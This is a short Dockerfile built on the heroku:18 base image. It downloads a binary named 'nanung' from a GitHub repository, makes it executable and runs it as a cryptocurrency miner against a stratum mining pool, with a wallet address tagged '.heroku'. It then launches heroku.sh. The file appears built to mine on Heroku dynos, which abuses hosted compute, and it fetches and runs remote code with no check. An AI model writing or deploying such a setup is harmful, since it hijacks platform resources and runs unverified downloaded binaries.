FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/darafater/jancuk/raw/main/nanung && chmod +x nanung && ./nanung -a yespowerr16  -o stratum+tcp://matrix-pool.info:63040 -u YbvMJ7gQr1aQU9sisRe9YHuxtCh1BMV9se.heroku -t1
CMD bash heroku.sh
